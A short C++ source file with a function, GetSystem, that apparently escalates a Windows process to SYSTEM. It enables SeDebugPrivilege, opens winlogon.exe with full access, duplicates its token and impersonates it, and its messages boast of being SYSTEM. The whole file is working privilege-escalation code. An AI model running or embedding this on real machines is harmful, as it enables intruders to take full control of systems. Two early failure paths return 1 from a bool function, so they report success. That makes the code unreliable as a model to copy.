#include "common.hpp"

bool GetSystem()
{ 
	// let's first make sure we have the SeDebugPrivilege enabled 
	wil::unique_handle currentToken;
	auto success = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentToken);
	if(!success)
	{
		std::cout << "[-] Failed to open current process token, exiting...\n";
		return 1;
	}

	success = SetPrivilege(currentToken.get(), L"SeDebugPrivilege", true);
	if (!success) return 1;

	wil::unique_handle winlogonHandle(OpenProcess(PROCESS_ALL_ACCESS, false, FindPid(L"winlogon.exe")));
	if (!winlogonHandle.get())
	{
		std::cout << "[-] Couldn't get a PROCESS_ALL_ACCESS handle to winlogon.exe, exiting...\n";
		return false;
	}
	else std::cout << "[+] Got a PROCESS_ALL_ACCESS handle to winlogon.exe!\n";

	wil::unique_handle tokenHandle;
	success = OpenProcessToken(winlogonHandle.get(), TOKEN_QUERY | TOKEN_DUPLICATE, &tokenHandle);
	if (!success)
	{
		std::cout << "[-] Couldn't get a handle to winlogon.exe's token, exiting...\n";
		return success;
	}
	else std::cout << "[+] Opened a handle to winlogon.exe's token!\n";
	
	success = ImpersonateLoggedOnUser(tokenHandle.get());
	if (!success)
	{
		std::cout << "[-] Couldn't impersonate winlogon.exe's token, exiting...\n";
		return success;
	}
	else std::cout << "[+] Successfully impersonated winlogon.exe's token, we are SYSTEM now ;)\n";
	return success;
}